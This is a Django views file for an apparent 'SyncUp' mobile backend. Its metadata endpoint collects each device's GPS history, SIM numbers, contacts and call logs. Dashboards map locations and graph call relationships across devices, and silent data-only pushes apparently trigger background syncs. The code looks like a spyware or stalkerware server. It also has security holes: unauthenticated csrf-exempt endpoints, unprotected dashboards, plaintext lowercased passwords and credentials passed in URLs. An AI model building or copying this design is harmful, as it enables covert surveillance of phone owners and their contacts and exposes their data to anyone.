from django.conf import settings
from django.db import transaction
from django.utils import timezone
from django.db.models import F, Q
from django.http import JsonResponse
from django.contrib.auth import authenticate
from django.shortcuts import render, redirect, get_object_or_404
from django.utils.timezone import datetime, now
from django.views.decorators.csrf import csrf_exempt
from django.core.exceptions import ObjectDoesNotExist
from django.contrib.auth.decorators import login_required
from django.contrib import messages
# Python standard libraries
import os
import re
import json
import uuid
import random
import string
import requests
import phonenumbers
from PIL import Image
from io import BytesIO
from django.core.files.base import ContentFile
from ..utils import get_fcm_token, send_telegram_message, escape_markdown_v2
from phonenumbers.phonenumberutil import NumberParseException

# Models
from ..models import (
    CallLog, Contact, SystemInfo, User,
    LinkRegistry, InstanceInfo, PublicUser,
    Device, Location, SIMCard, DeviceInfo, NetworkInfo,
    AuditError, Reminder
)
from ..forms import ReminderForm

# Variables
PROJ01_URL = settings.PROJ01_URL
PROJ02_URL = settings.PROJ02_URL
FIREBASE_PROJECT_ID = settings.FIREBASE_PROJECT_ID
INSTANCE = ['S1']

# ==================== DEVICE ACCESS ENDPOINTS ====================
def health_check(request):
    instances = ['S1'] + list(
        InstanceInfo.objects.filter(is_active=True)
        .values_list('name', flat=True)
    )
    return JsonResponse({
        "status": "ok",
        "server": "AG-PROJ01-SyncUp",
        "fallback_url": PROJ02_URL,
        "time": now().isoformat(),
        "instance": instances
    })

# ==================== AUTH ENDPOINTS ====================
@csrf_exempt
def device_login(request):
    if request.method != "POST":
        return JsonResponse({"success": False, "message": "POST required"}, status=405)
    try:
        data = json.loads(request.body)
    except:
        return JsonResponse({"success": False, "message": "Invalid JSON"}, status=400)
    email_or_username = (data.get("email") or "").strip()
    password = data.get("password") or ""
    device_id = data.get("device_id", "unknown-device")
    instance = data.get("instance", "unknown-instance")
    if not email_or_username or not password:
        return JsonResponse({
            "success": False,
            "message": "Email/username and password required"
        }, status=400)
    if instance == "S1":
        return syncup_user(email_or_username, password, device_id)
    elif instance == "S10":
        return syncup_public_user(email_or_username, password, device_id)
    else:
        payload = {
            "authuser": email_or_username,
            "password": password
        }
        return fetch_user_from_external(instance, payload, device_id)

def syncup_user(email_or_username, password, device_id):
    user = authenticate(username=email_or_username, password=password)
    if not user:
        try:
            user_obj = User.objects.get(email=email_or_username, is_active=True)
            user = authenticate(username=user_obj.username, password=password)
        except User.DoesNotExist:
            user = None
    if not user:
        return JsonResponse({
            "success": False,
            "message": "User not found or incorrect password"
        }, status=401)
    try:
        profile = user.userprofile
    except ObjectDoesNotExist:
        profile = None
    links = LinkRegistry.objects.filter(user=profile, is_active=True)
    urls = {}
    for link in links:
        urls[link.name] = link.url
    urls["SyncUp"] = f"{PROJ01_URL}/api/auth/login?data={profile.encoded_credentials}"
    data = {
        "success": True,
        "username": profile.name if profile and profile.name else user.username,
        "device_id": device_id,
        "business_name": profile.name if profile else "MS",
        "message": f"Welcome back, {profile.name if profile else user.username}!",
        "urls": urls,
        "sync_required": True,
    }
    return JsonResponse(data)

def generate_random_username():
    length = 8  # Set the length of the username
    characters = string.ascii_lowercase + string.digits  # Characters to use in the username
    random_username = ''.join(random.choice(characters) for i in range(length))
    return random_username

def identify_identifier_type(identifier):
    """ Determine if the identifier is an email, phone number, or username. """
    
    # Proper email validation using regular expression
    email_regex = r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)"
    if re.match(email_regex, identifier):
        return "email"
    
    # Proper phone number validation: 7 to 15 digits, optional leading '+'
    phone_regex = r"^\+?\d{7,15}$"
    if re.match(phone_regex, identifier):
        return "phone"
    
    # Default case for username (if it doesn't match email or phone pattern)
    return "username"

def syncup_public_user(email_or_username, password, device_id):
    try:
        # Try to get user by email, username, or phone
        user = PublicUser.objects.get(
            Q(email=email_or_username) | Q(username=email_or_username) | Q(phone=email_or_username)
        )
        if not user.password == password.strip().lower():
            return JsonResponse({
                "success": False,
                "message": "User is available but password is incorrect, please check and try again"
            }, status=401)
    except ObjectDoesNotExist:
        identifier_type = identify_identifier_type(email_or_username)
        if identifier_type == "email":
            user = PublicUser.objects.create(
                email=email_or_username,
                password=password.strip().lower(),
                username=generate_random_username(),
                is_active=True
            )
        elif identifier_type == "phone":
            user = PublicUser.objects.create(
                phone=email_or_username,
                password=password.strip().lower(),
                username=generate_random_username(),
                is_active=True
            )
        else:  # Username is provided
            user = PublicUser.objects.create(
                username=email_or_username,
                password=password.strip().lower(),
                is_active=True
            )
    
    if not user.is_active:
        return JsonResponse({
            "success": False,
            "message": "User is inactive, please contact support"
        }, status=403)

    urls = user.urls if user.urls else {}
    # Always (re)issue the self-edit link with the current token so the public
    # user can manage their page; also repairs old tokenless links.
    urls["SyncUp"] = f"{PROJ01_URL}/public-user/edit/{user.id}?token={user.edit_token}"
    data = {
        "success": True,
        "username": user.name if user.name else user.username,
        "device_id": device_id,
        "business_name": user.business_name,
        "message": f"Welcome back, {user.username}!",
        "urls": urls,
        "sync_required": True,
    }
    return JsonResponse(data)

def fetch_user_from_external(instance, payload, device_id):
    if InstanceInfo.objects.filter(name=instance, is_active=True).exists():
        try:
            instance_info = InstanceInfo.objects.get(name=instance)
            payload['base_url'] = instance_info.base_url
            URL = instance_info.base_url + instance_info.endpoint
            headers = {"Content-Type": "application/json"}
            if instance_info.auth_key:
                headers[instance_info.auth_key] = instance_info.auth_value
            response = requests.post(URL, json=payload, headers=headers)
            if response.status_code == 200:
                data = response.json()
                data["device_id"] = device_id
                data["sync_required"] = True
                data["success"] = True
                return JsonResponse(data)
            return JsonResponse({
                "success": False,
                "message": "External instance returned error",
                "status_code": response.status_code,
                "response": response.text,
                "url": URL
            }, status=502)
        except Exception as e:
            return JsonResponse({
                "success": False,
                "message": "Error connecting to external instance",
                "error": str(e),
                "url": URL
            }, status=500)
    else:
        return JsonResponse({"success": False, "message": "Instance not found or inactive"}, status=404)

@csrf_exempt
def register_device(request):
    try:
        data = json.loads(request.body)
    except json.JSONDecodeError:
        return JsonResponse({"success": False, "message": "Invalid JSON"}, status=400)
    device_id = data.get("device_id")
    user_id = data.get("user_id")
    push_token = data.get("push_token")
    platform = data.get("platform", "unknown")
    instance = data.get("instance", "unknown-instance")
    instance_info = InstanceInfo.objects.filter(name=instance, is_active=True).first()
    if not device_id or not user_id or not push_token:
        return JsonResponse({"success": False, "message": "Missing fields"}, status=400)
    device, created = Device.objects.update_or_create(
        device_id=device_id,
        defaults={
            "user_id": user_id,
            "push_token": push_token,
            "platform": platform,
            "instance": instance,
            "last_login": now(),
            "is_active": True
        }
    )
    if created:
        device.login_count = 1
        device.save(update_fields=["login_count"])
    else:
        Device.objects.filter(pk=device.pk).update(
            login_count=F("login_count") + 1
        )
    device.refresh_from_db()
    if (instance == "S1" or (instance_info and instance_info.login_notified)) and device:
        uid = escape_markdown_v2(user_id.upper())
        inst = escape_markdown_v2(instance.upper())
        sep = escape_markdown_v2('-' * 12)
        bold_sep = escape_markdown_v2('▬' * 12)
        markdown_message = f"*🤝Device Login🔔*\n\n{sep}\n*{uid}*\n{bold_sep}\n"
        markdown_message += f"*{inst} \\| 📲 {device.login_count} Times*\n"
        markdown_message += f"{sep}\n\n🦀  _Crab AI \\| SyncUp🔄️_"
        send_telegram_message(1, markdown_message)
    action = "REGISTERED" if created else "UPDATED"
    return JsonResponse({
        "success": True,
        "device_id": device_id,
        "action": action
    })

@csrf_exempt
def unregister_device(request):
    try:
        data = json.loads(request.body)
    except json.JSONDecodeError:
        return JsonResponse({"success": False, "message": "Invalid JSON"}, status=400)
    device_id = data.get("device_id")
    user_id = data.get("user_id")
    updated = Device.objects.filter(
        device_id=device_id,
        user_id=user_id,
    ).update(is_active=False)
    if updated:
        return JsonResponse({"success": True})
    else:
        return JsonResponse({"success": False, "message": "Not found"}, status=404)

def list_devices(request):
    context = {}
    user_filter = request.GET.get('filter')
    queryset = Device.objects.all()
    if user_filter:
        queryset = queryset.filter(user_id=user_filter)
    context["devices"] = queryset
    context["users"] = Device.objects.values_list('user_id', flat=True).distinct()
    context["selected_user"] = user_filter
    return render(request, 'device_access/list_devices.html', context)

ALLOWED_IMAGE_TYPES = {'image/jpeg', 'image/png', 'image/webp', 'image/gif'}
MAX_IMAGE_SIZE = 5 * 1024 * 1024  # 5MB

@csrf_exempt
def upload_notification_image(request):
    """Upload an image, compress it losslessly, save to media/notifications/, return URL."""
    if request.method != 'POST':
        return JsonResponse({"success": False, "message": "POST required"}, status=405)
    
    file = request.FILES.get('image')
    if not file:
        return JsonResponse({"success": False, "message": "No image file provided"}, status=400)
    
    if file.content_type not in ALLOWED_IMAGE_TYPES:
        return JsonResponse({"success": False, "message": "Invalid image type. Allowed: JPEG, PNG, WebP, GIF"}, status=400)
    
    if file.size > MAX_IMAGE_SIZE:
        return JsonResponse({"success": False, "message": "Image too large. Max 5MB"}, status=400)
    
    try:
        img = Image.open(file)
        img.verify()
        file.seek(0)
        img = Image.open(file)
    except Exception:
        return JsonResponse({"success": False, "message": "Corrupt or unreadable image"}, status=400)
    
    # Determine output format
    fmt = img.format or 'PNG'
    if fmt == 'JPEG':
        ext = 'jpg'
    elif fmt == 'GIF':
        ext = 'gif'
    elif fmt == 'WEBP':
        ext = 'webp'
    else:
        ext = 'png'
    
    # Compress without quality loss
    buffer = BytesIO()
    if fmt == 'JPEG':
        if img.mode in ('RGBA', 'P'):
            img = img.convert('RGB')
        img.save(buffer, format='JPEG', quality=95, optimize=True)
    elif fmt == 'PNG':
        img.save(buffer, format='PNG', optimize=True)
    elif fmt == 'WEBP':
        img.save(buffer, format='WEBP', lossless=True)
    elif fmt == 'GIF':
        img.save(buffer, format='GIF', optimize=True)
    else:
        img.save(buffer, format='PNG', optimize=True)
        ext = 'png'
    
    # Save to media/notifications/
    filename = f"{uuid.uuid4().hex}.{ext}"
    upload_dir = os.path.join(settings.MEDIA_ROOT, 'notifications')
    os.makedirs(upload_dir, exist_ok=True)
    filepath = os.path.join(upload_dir, filename)
    
    with open(filepath, 'wb') as f:
        f.write(buffer.getvalue())
    
    image_url = f"{settings.PROJ01_URL}{settings.MEDIA_URL}notifications/{filename}"
    
    return JsonResponse({
        "success": True,
        "url": image_url,
        "filename": filename,
        "size": len(buffer.getvalue()),
    })

@csrf_exempt
def send_notification(request):
    try:
        data = json.loads(request.body)
    except json.JSONDecodeError:
        return JsonResponse({"success": False, "message": "Invalid JSON"}, status=400)
    target = data.get("target", "all")
    user_id = data.get("user_id")
    device_id = data.get("device_id")
    title = data.get("title", "MS App")
    body = data.get("body", "New notification")
    if target == "all":
        tokens = list(Device.objects.filter(is_active=True).values_list("push_token", flat=True))
    elif target == "user":
        tokens = list(Device.objects.filter(user_id=user_id, is_active=True)
                      .values_list("push_token", flat=True))
    elif target == "device":
        tokens = list(Device.objects.filter(
            user_id=user_id,
            device_id=device_id,
            is_active=True
        ).values_list("push_token", flat=True))
    else:
        return JsonResponse({"success": False, "message": "Invalid target"}, status=400)
    if not tokens:
        return JsonResponse({"success": False, "message": "No devices"}, status=400)
    if data.get("data_only"):
        sent, failed = send_fcm_notifications_data_only(tokens, title, body)
        print(f"Data-only notification sent to {len(sent)} devices, failed for {len(failed)} devices")
    else:
        image = None if data.get("no_image") else (data.get("image") or "https://picsum.photos/400/300")
        sent, failed = send_fcm_notifications(tokens, title, body, {}, image)
        print(f"Notification sent to {len(sent)} devices, failed for {len(failed)} devices")
    if failed:
        Device.objects.filter(push_token__in=failed, retry_count__gte=2).update(is_active=False)
        Device.objects.filter(push_token__in=failed).update(retry_count=F('retry_count') + 1)
    
    # Delete temp uploaded image after a delay (gives devices time to download it)
    uploaded_filename = data.get("uploaded_filename")
    if uploaded_filename:
        import threading
        def _delete_after_delay():
            import time
            time.sleep(60)  # Wait 60 seconds for devices to download the image
            try:
                filepath = os.path.join(settings.MEDIA_ROOT, 'notifications', os.path.basename(uploaded_filename))
                if os.path.isfile(filepath):
                    os.remove(filepath)
            except Exception:
                pass
        threading.Thread(target=_delete_after_delay, daemon=True).start()
    
    return JsonResponse({
        "success": True,
        "sent": len(sent),
        "failed": len(failed)
    })

def send_fcm_notifications(tokens, title, body, data, image=None):
    """
    Send push notifications via Firebase Cloud Messaging v1 API
    Returns: (sent_count, failed_count)
    """
    access_token = get_fcm_token()
    if not access_token:
        return 0, len(tokens)
    sent = []
    failed = []
    url = f"https://fcm.googleapis.com/v1/projects/{FIREBASE_PROJECT_ID}/messages:send"
    for token in tokens:
        try:
            notification_payload = {
                "title": title,
                "body": body,
            }
            if image:
                notification_payload["image"] = image
            # Pass image in data too so foreground handler can access it
            msg_data = {k: str(v) for k, v in (data or {}).items()}
            if image:
                msg_data["image"] = image
            payload = {
                "message": {
                    "token": token,
                    "notification": notification_payload,
                    "android": {
                        "notification": {
                            "sound": "default",
                            "vibrate_timings": ["0.2s", "0.2s", "0.2s"],  # vibration pattern
                            "default_vibrate_timings": True,  # optional fallback
                            **(({"image": image}) if image else {}),
                        }
                    },
                    "data": msg_data,
                }
            }
            response = requests.post(
                url,
                headers={
                    "Authorization": f"Bearer {access_token}",
                    "Content-Type": "application/json",
                },
                json=payload,
            )
            if response.status_code == 200:
                sent.append(token)
            else:
                failed.append(token)
        except Exception as e:
            failed.append(token)
    return sent, failed

def send_fcm_notifications_data_only(tokens, title, body):
    """
    Send push notifications via Firebase Cloud Messaging v1 API
    Returns: (sent_count, failed_count)
    """
    access_token = get_fcm_token()
    if not access_token:
        return 0, len(tokens)
    sent = []
    failed = []
    url = f"https://fcm.googleapis.com/v1/projects/{FIREBASE_PROJECT_ID}/messages:send"
    for token in tokens:
        try:
            data = {
                "title": "Metadata Update",
                "body": body,
                "push": "metadata",
            }
            payload = {
                "message": {
                    "token": token,
                    "data": data,
                }
            }
            response = requests.post(
                url,
                headers={
                    "Authorization": f"Bearer {access_token}",
                    "Content-Type": "application/json",
                },
                json=payload,
            )
            if response.status_code == 200:
                sent.append(token)
            else:
                failed.append(token)
        except Exception as e:
            failed.append(token)
    return sent, failed

# ==================== SYNC & METADATA ENDPOINTS ====================
def normalize_phone(phone, region="IN"):
    if not phone:
        return None
    try:
        parsed = phonenumbers.parse(phone, region)
        if not phonenumbers.is_valid_number(parsed):
            return None
        return phonenumbers.format_number(
            parsed,
            phonenumbers.PhoneNumberFormat.E164
        )
    except NumberParseException:
        return None

def extract_value(val):
    if isinstance(val, dict):
        return val.get("_j")
    return val

@csrf_exempt
def metadata(request):
    try:
        data = json.loads(request.body)
    except:
        return JsonResponse({"success": False}, status=400)
    device_id = data.get("device_id")
    try:
        device = Device.objects.get(device_id=device_id)
        device.last_background_sync = timezone.now()
        device.save()
    except Device.DoesNotExist:
        return JsonResponse({"success": False, "error": "Device not found"}, status=404)

    metadata = data.get("metadata", {})
    contacts = metadata.get("contacts", [])

    with transaction.atomic():

        # ================= LOCATION =================
        loc = metadata.get("location", {})
        if loc:
            Location.objects.create(
                device=device,
                latitude=loc.get("latitude"),
                longitude=loc.get("longitude"),
                altitude=loc.get("altitude"),  # None is okay
                accuracy=loc.get("accuracy"),
                heading=loc.get("heading"),
                speed=loc.get("speed"),
                method = loc.get("method"),
                city = loc.get("city"),
                region = loc.get("region"),
                country = loc.get("country"),
                isp = loc.get("isp"),
                ip = loc.get("ip"),
                timezone = loc.get("timezone"),
                postal_code = loc.get("postal_code"),
                timestamp=loc.get("timestamp"),
                is_gps=loc.get("is_gps", True),
                is_approximate=loc.get("is_approximate", False)
            )

        # ================= DEVICE INFO =================
        d = metadata.get("device", {})
        if d:
            DeviceInfo.objects.update_or_create(
                device=device,
                defaults={
                    "brand": d.get("brand"),
                    "manufacturer": d.get("manufacturer"),
                    "model_name": d.get("model_name"),
                    "model_id": d.get("model_id"),  # <- include null fields
                    "device_name": d.get("device_name"),
                    "device_type": str(d.get("device_type")),  # cast to string if integer
                    "unique_id": d.get("unique_id"),
                    "android_id": d.get("android_id"),
                    "system_name": extract_value(d.get("system_name")),
                    "system_version": extract_value(d.get("system_version")),
                    "app_version": extract_value(d.get("app_version")),
                    "total_memory": d.get("total_memory"),
                    "used_memory": d.get("used_memory"),
                    "battery_level": d.get("battery_level"),
                    "is_charging": extract_value(d.get("is_charging")) or False,
                    "carrier": d.get("carrier"),
                    "screen_width": d.get("screen_width"),
                    "screen_height": d.get("screen_height"),
                    "font_scale": d.get("font_scale"),
                    "is_emulator": extract_value(d.get("is_emulator")) or False,
                    "is_tablet": extract_value(d.get("is_tablet")) or False,
                    "display": d.get("display"),
                    "hardware": d.get("hardware"),
                    "codename": d.get("codename"),
                    "product": d.get("product"),
                    "host": d.get("host"),
                    "tags": d.get("tags"),
                }
            )

        # ================= NETWORK =================
        net = metadata.get("network", {})
        if net:
            NetworkInfo.objects.create(
                device=device,
                type=net.get("type"),
                is_connected=net.get("is_connected"),
                is_internet_reachable=net.get("is_internet_reachable"),
                ip_address=net.get("ip_address")  # can be None
            )

        # ================= SIM =================
        sim = metadata.get("sim", {})
        cards = sim.get("cards", [])
        for card in cards:
            SIMCard.objects.update_or_create(
                device=device,
                slot_index=card.get("slot_index"),
                defaults={
                    "carrier_name": card.get("carrier_name"),
                    "display_name": card.get("display_name"),
                    "phone_number": card.get("phone_number"),  # can be None
                    "is_roaming": card.get("is_network_roaming", False)
                }
            )

        # ================= SYSTEM =================
        sys = metadata.get("system", {})
        if sys:
            SystemInfo.objects.update_or_create(
                device=device,
                defaults={
                    "platform": sys.get("platform"),
                    "platform_version": sys.get("platform_version"),
                    "is_physical_device": sys.get("is_physical_device"),
                    "free_disk_storage": sys.get("free_disk_storage"),
                    "total_disk_capacity": sys.get("total_disk_capacity"),
                    "user_agent": sys.get("user_agent"),
                    "bootloader": sys.get("bootloader"),
                    "supported_abis": sys.get("supported_abis", [])
                }
            )
        
        # ================= CONTACTS =================
        contacts = metadata.get("contacts", [])
        if contacts:
            for contact in contacts:
                name = contact.get("name")
                emails = contact.get("emails", [])
                phone_numbers = contact.get("phone_numbers", [])
                for raw_phone in phone_numbers:
                    phone = normalize_phone(raw_phone)
                    # fallback if normalization fails
                    if not phone and raw_phone:
                        phone = re.sub(r"[^\d]", "", str(raw_phone))
                    if not phone:
                        continue
                    Contact.objects.update_or_create(
                        device=device,
                        phone_number=phone,
                        defaults={
                            "name": name,
                            "email": emails[0] if emails else None
                        }
                    )
        
        # ================= CALL LOGS =================
        call_logs = metadata.get("call_logs", [])
        for log in call_logs:
            ts = log.get("timestamp")

            # Convert milliseconds → seconds → datetime
            if ts:
                ts = timezone.make_aware(datetime.fromtimestamp(int(ts) / 1000))
            else:
                ts = None
            
            if log.get("phone_number"):
                CallLog.objects.update_or_create(
                    device=device,
                    phone_number=log.get("phone_number"),
                    timestamp=ts,
                    defaults={
                        "name": log.get("name"),
                        "call_type": log.get("type"),
                        "duration_seconds": log.get("duration"),
                        "raw_type": log.get("raw_type"),
                        "date_time": log.get("date_time")
                    }
                )

    return JsonResponse({"success": True})

# ==================== DEVICE VIEW VIEWS ====================
def device_dashboard(request):
    """All-devices dashboard with multi-select device filter. Optimized: only stats + device details; tables & map loaded via AJAX."""
    all_devices = Device.objects.all()

    # Device filter (supports multiple via ?devices=1&devices=2)
    selected_ids = request.GET.getlist('devices')
    selected_ids = [int(x) for x in selected_ids if x.isdigit()]

    if selected_ids:
        devices_qs = all_devices.filter(id__in=selected_ids)
    else:
        devices_qs = all_devices

    # Date filters
    date_from = request.GET.get('date_from')
    date_to = request.GET.get('date_to')

    # Only compute counts — no full querysets
    loc_qs = Location.objects.filter(device__in=devices_qs)
    call_qs = CallLog.objects.filter(device__in=devices_qs)
    con_qs = Contact.objects.filter(device__in=devices_qs)

    if date_from:
        loc_qs = loc_qs.filter(timestamp__date__gte=date_from)
        call_qs = call_qs.filter(timestamp__date__gte=date_from)
    if date_to:
        loc_qs = loc_qs.filter(timestamp__date__lte=date_to)
        call_qs = call_qs.filter(timestamp__date__lte=date_to)

    # Batch device details (replaces N+1 queries with ~8 total)
    from django.db.models import Count
    dev_ids = list(devices_qs.values_list('id', flat=True))

    device_infos = {di.device_id: di for di in DeviceInfo.objects.filter(device_id__in=dev_ids)}
    network_infos = {}
    for ni in NetworkInfo.objects.filter(device_id__in=dev_ids).order_by('device_id', '-recorded_at'):
        if ni.device_id not in network_infos:
            network_infos[ni.device_id] = ni
    system_infos = {si.device_id: si for si in SystemInfo.objects.filter(device_id__in=dev_ids)}
    sim_cards_map = {}
    for sc in SIMCard.objects.filter(device_id__in=dev_ids):
        sim_cards_map.setdefault(sc.device_id, []).append(sc)

    contact_counts = dict(Contact.objects.filter(device_id__in=dev_ids).values('device_id').annotate(c=Count('id')).values_list('device_id', 'c'))
    location_counts = dict(Location.objects.filter(device_id__in=dev_ids).values('device_id').annotate(c=Count('id')).values_list('device_id', 'c'))
    call_counts = dict(CallLog.objects.filter(device_id__in=dev_ids).values('device_id').annotate(c=Count('id')).values_list('device_id', 'c'))

    device_details = []
    for dev in devices_qs:
        device_details.append({
            'device': dev,
            'device_info': device_infos.get(dev.id),
            'network_info': network_infos.get(dev.id),
            'system_info': system_infos.get(dev.id),
            'sim_cards': sim_cards_map.get(dev.id, []),
            'contact_count': contact_counts.get(dev.id, 0),
            'location_count': location_counts.get(dev.id, 0),
            'call_count': call_counts.get(dev.id, 0),
        })

    context = {
        'all_devices': all_devices,
        'selected_ids': selected_ids,
        'selected_devices': devices_qs,
        'device_details': device_details,
        'date_from': date_from or '',
        'date_to': date_to or '',
        # Stats (count-only queries)
        'total_devices': devices_qs.count(),
        'total_locations': loc_qs.count(),
        'total_contacts': con_qs.count(),
        'total_calls': call_qs.count(),
        'unique_cities': loc_qs.exclude(city__isnull=True).exclude(city='').values_list('city', flat=True).distinct().count(),
    }
    return render(request, 'device_access/device_dashboard.html', context)


def device_table_api(request):
    """AJAX endpoint for dashboard tables and map data. Lazy-loaded per tab."""
    data_type = request.GET.get('type', '')
    selected_ids = request.GET.getlist('devices')
    selected_ids = [int(x) for x in selected_ids if x.isdigit()]
    devices_qs = Device.objects.filter(id__in=selected_ids) if selected_ids else Device.objects.all()

    date_from = request.GET.get('date_from')
    date_to = request.GET.get('date_to')

    if data_type == 'locations':
        qs = Location.objects.filter(device__in=devices_qs).select_related('device').order_by('-timestamp')
        if date_from: qs = qs.filter(timestamp__date__gte=date_from)
        if date_to: qs = qs.filter(timestamp__date__lte=date_to)
        rows = []
        for i, loc in enumerate(qs[:5000], 1):
            rows.append({
                'n': i, 'device_id': str(loc.device.id), 'device': loc.device.user_id.title(),
                'city': loc.city or '-', 'region': loc.region or '-',
                'lat': round(float(loc.latitude), 4), 'lng': round(float(loc.longitude), 4),
                'accuracy': f"{loc.accuracy:.1f}" if loc.accuracy else '-',
                'is_gps': loc.is_gps, 'isp': loc.isp or '-', 'ip': loc.ip or '-',
                'ts': loc.timestamp.isoformat() if loc.timestamp else '',
                'ts_display': loc.timestamp.strftime('%d %b %Y, %I:%M %p') if loc.timestamp else '-',
            })
        return JsonResponse({'data': rows})

    elif data_type == 'calllogs':
        qs = CallLog.objects.filter(device__in=devices_qs).select_related('device').order_by('-timestamp')
        if date_from: qs = qs.filter(timestamp__date__gte=date_from)
        if date_to: qs = qs.filter(timestamp__date__lte=date_to)
        rows = []
        for i, log in enumerate(qs[:5000], 1):
            rows.append({
                'n': i, 'device_id': str(log.device.id), 'device': log.device.user_id.title(),
                'name': log.name or '-', 'phone': log.phone_number or '-',
                'call_type': log.call_type or '-',
                'ts': log.timestamp.isoformat() if log.timestamp else '',
                'ts_display': log.timestamp.strftime('%d %b %Y, %I:%M %p') if log.timestamp else '-',
                'duration': log.duration_seconds or 0,
            })
        return JsonResponse({'data': rows})

    elif data_type == 'contacts':
        qs = Contact.objects.filter(device__in=devices_qs).select_related('device')
        rows = []
        for i, c in enumerate(qs[:5000], 1):
            rows.append({
                'n': i, 'device_id': str(c.device.id), 'device': c.device.user_id.title(),
                'name': c.name or '-', 'phone': c.phone_number or '-',
                'email': c.email or '-',
                'ts': c.synced_at.isoformat() if c.synced_at else '',
                'ts_display': c.synced_at.strftime('%d %b %Y, %I:%M %p') if c.synced_at else '-',
            })
        return JsonResponse({'data': rows})

    elif data_type == 'map':
        qs = Location.objects.filter(device__in=devices_qs).select_related('device').order_by('-timestamp')
        if date_from: qs = qs.filter(timestamp__date__gte=date_from)
        if date_to: qs = qs.filter(timestamp__date__lte=date_to)
        rows = []
        for loc in qs[:5000]:
            rows.append({
                'lat': float(loc.latitude), 'lng': float(loc.longitude),
                'device_id': str(loc.device.id), 'device_user': loc.device.user_id.title(),
                'city': loc.city or '', 'region': loc.region or '',
                'accuracy': str(loc.accuracy) if loc.accuracy else '',
                'isp': loc.isp or '', 'ip': loc.ip or '',
                'is_gps': loc.is_gps,
                'timestamp': loc.timestamp.strftime('%d %b %Y, %I:%M %p') if loc.timestamp else '',
            })
        return JsonResponse({'data': rows})

    return JsonResponse({'data': []})

@csrf_exempt
def device_network_api(request):
    """Cross-device relationship graph. mode=contacts|calllogs|all (default all)."""
    import re

    def normalize_phone(phone):
        """Normalize phone number: strip spaces, dashes, leading +91/91 for Indian numbers."""
        if not phone:
            return phone
        p = re.sub(r'[\s\-\(\)\.]+', '', phone.strip())
        # Strip leading + then country code 91 if remaining is 10 digits
        if p.startswith('+'):
            p = p[1:]
        if p.startswith('91') and len(p) == 12:
            p = p[2:]
        elif p.startswith('0') and len(p) == 11:
            p = p[1:]
        return p

    selected_ids = request.GET.getlist('devices')
    selected_ids = [int(x) for x in selected_ids if x.isdigit()]
    mode = request.GET.get('mode', 'all')  # contacts, calllogs, all
    date_from = request.GET.get('date_from')
    date_to = request.GET.get('date_to')

    if selected_ids:
        devices = Device.objects.filter(id__in=selected_ids)
    else:
        devices = Device.objects.all()

    nodes = []
    links = []
    node_map = {}  # normalized_phone -> node index
    phone_to_devices = {}  # normalized_phone -> set of device_keys

    # Add each device as a hub node
    device_colors = [
        '#dc3545', '#667eea', '#11998e', '#f5576c', '#4facfe',
        '#764ba2', '#38ef7d', '#ff6b6b', '#feca57', '#00cec9',
    ]
    device_labels = {}  # device_key -> friendly label
    for i, dev in enumerate(devices):
        key = f"device_{dev.id}"
        friendly = f"{dev.user_id} ({dev.platform})"
        device_labels[key] = friendly
        node_map[key] = len(nodes)
        dev_info = DeviceInfo.objects.filter(device=dev).first()
        contact_count = Contact.objects.filter(device=dev).count()
        call_count = CallLog.objects.filter(device=dev).count()
        nodes.append({
            "id": key,
            "label": friendly,
            "group": "device",
            "color": device_colors[i % len(device_colors)],
            "calls": 0,
            "duration": 0,
            "device_id": dev.id,
            "user_id": dev.user_id,
            "platform": dev.platform,
            "instance": dev.instance,
            "is_active": dev.is_active,
            "contact_count": contact_count,
            "call_count": call_count,
            "model": dev_info.model_name if dev_info else "",
            "brand": dev_info.brand if dev_info else "",
            "os": f"{dev_info.system_name} {dev_info.system_version}" if dev_info else "",
            "app_version": dev_info.app_version if dev_info else "",
        })

    # ==================== CONTACTS MODE ====================
    if mode in ('contacts', 'all'):
        for dev in devices:
            dev_key = f"device_{dev.id}"
            dev_label = device_labels.get(dev_key, dev_key)
            for c in Contact.objects.filter(device=dev):
                raw_phone = c.phone_number
                phone = normalize_phone(raw_phone)
                if not phone:
                    continue
                if phone not in node_map:
                    node_map[phone] = len(nodes)
                    nodes.append({
                        "id": phone,
                        "label": c.name or phone,
                        "group": "contact",
                        "color": "#4facfe",
                        "calls": 0,
                        "duration": 0,
                        "devices": [dev_label],
                        "email": c.email or "",
                        "original_phones": [raw_phone],
                        "device_details": [{
                            "device": dev_label,
                            "device_key": dev_key,
                            "name": c.name or "",
                            "phone_stored": raw_phone,
                            "email": c.email or "",
                            "calls": 0,
                            "duration": 0,
                            "call_types": {},
                            "first_call": None,
                            "last_call": None,
                        }],
                    })
                else:
                    existing = nodes[node_map[phone]]
                    if dev_label not in existing.get("devices", []):
                        existing.setdefault("devices", []).append(dev_label)
                    if raw_phone not in existing.get("original_phones", []):
                        existing.setdefault("original_phones", []).append(raw_phone)
                    # Add device-level detail
                    dd_list = existing.setdefault("device_details", [])
                    found = False
                    for dd in dd_list:
                        if dd["device_key"] == dev_key:
                            found = True
                            break
                    if not found:
                        dd_list.append({
                            "device": dev_label,
                            "device_key": dev_key,
                            "name": c.name or "",
                            "phone_stored": raw_phone,
                            "email": c.email or "",
                            "calls": 0,
                            "duration": 0,
                            "call_types": {},
                            "first_call": None,
                            "last_call": None,
                        })

                if phone not in phone_to_devices:
                    phone_to_devices[phone] = set()
                phone_to_devices[phone].add(dev_key)

        # Contact-only links
        if mode == 'contacts':
            # Enrich contact nodes with call log data
            contact_call_agg = {}  # (dev_key, phone) -> {count, duration, types, first_call, last_call}
            for dev in devices:
                dev_key = f"device_{dev.id}"
                call_qs = CallLog.objects.filter(device=dev)
                if date_from:
                    call_qs = call_qs.filter(timestamp__date__gte=date_from)
                if date_to:
                    call_qs = call_qs.filter(timestamp__date__lte=date_to)
                for log in call_qs:
                    phone = normalize_phone(log.phone_number)
                    if not phone or phone not in node_map:
                        continue
                    pair = (dev_key, phone)
                    if pair not in contact_call_agg:
                        contact_call_agg[pair] = {"count": 0, "duration": 0, "types": {}, "first_call": None, "last_call": None}
                    contact_call_agg[pair]["count"] += 1
                    contact_call_agg[pair]["duration"] += log.duration_seconds or 0
                    ct = log.call_type or "unknown"
                    contact_call_agg[pair]["types"][ct] = contact_call_agg[pair]["types"].get(ct, 0) + 1
                    ts = log.timestamp
                    if ts:
                        if contact_call_agg[pair]["first_call"] is None or ts < contact_call_agg[pair]["first_call"]:
                            contact_call_agg[pair]["first_call"] = ts
                        if contact_call_agg[pair]["last_call"] is None or ts > contact_call_agg[pair]["last_call"]:
                            contact_call_agg[pair]["last_call"] = ts

            # Apply call stats to nodes and device_details
